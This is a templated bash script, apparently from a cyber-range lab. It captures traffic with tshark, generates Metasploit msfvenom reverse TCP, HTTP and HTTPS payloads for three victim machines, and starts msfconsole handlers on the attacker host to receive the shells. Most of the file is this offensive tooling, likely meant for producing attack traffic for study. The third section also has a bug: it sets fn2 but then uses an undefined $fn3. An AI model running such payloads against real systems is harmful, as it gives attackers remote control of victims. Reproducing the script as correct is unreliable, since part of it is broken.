#!/bin/bash
set -e
set -x

mkdir -p {{ range_root }}

# Start capture network traffic

nohup tshark -i {{ attacker['nic'] }} -f "not arp and net {{ range_net }}" -c {{ packet_cnt }} -w {{ range_root }}/{{ pcap_file }} &> {{ range_root }}/tshark.log &
sleep 5
echo -n "tshark PID: " && pgrep tshark

# vim1: reverse tcp on MSF

fn1=/vagrant/{{ range_root }}/{{ victim['vm1']['beacon_file']}}
msfvenom --payload {{ victim['vm1']['payload'] }} --platform {{ victim['vm1']['platform'] }} --arch {{ victim['vm1']['arch'] }} LHOST={{ attacker['ip'] }} LPORT={{ attacker['listener']['msf']['rtcp_port'] }} -f {{ victim['vm1']['beacon_format'] }} > $fn1

cat << EOF > $fn1.rc
use exploit/multi/handler
set PAYLOAD {{ victim['vm1']['payload'] }}
set LHOST {{ attacker['ip'] }}
set LPORT {{ attacker['listener']['msf']['rtcp_port'] }}
exploit
EOF

nohup msfconsole -r $fn1.rc &> $fn1.log &

# vim2: reverse http on MSF

fn2=/vagrant/{{ range_root }}/{{ victim['vm2']['beacon_file']}}
msfvenom --payload {{ victim['vm2']['payload'] }} --platform {{ victim['vm2']['platform'] }} --arch {{ victim['vm2']['arch'] }} LHOST={{ attacker['ip'] }} LPORT={{ attacker['listener']['msf']['rhttp_port'] }} -f {{ victim['vm2']['beacon_format'] }} > $fn2

cat << EOF > $fn2.rc
use exploit/multi/handler
set PAYLOAD {{ victim['vm2']['payload'] }}
set LHOST {{ attacker['ip'] }}
set LPORT {{ attacker['listener']['msf']['rhttp_port'] }}
exploit
EOF

nohup msfconsole -r $fn2.rc &> $fn2.log &

# vim3: reverse https on MSF

fn2=/vagrant/{{ range_root }}/{{ victim['vm3']['beacon_file']}}
msfvenom --payload {{ victim['vm3']['payload'] }} --platform {{ victim['vm3']['platform'] }} --arch {{ victim['vm3']['arch'] }} LHOST={{ attacker['ip'] }} LPORT={{ attacker['listener']['msf']['rhttps_port'] }} -f {{ victim['vm3']['beacon_format'] }} > $fn3

cat << EOF > $fn3.rc
use exploit/multi/handler
set PAYLOAD {{ victim['vm3']['payload'] }}
set LHOST {{ attacker['ip'] }}
set LPORT {{ attacker['listener']['msf']['rhttps_port'] }}
exploit
EOF

nohup msfconsole -r $fn3.rc &> $fn3.log
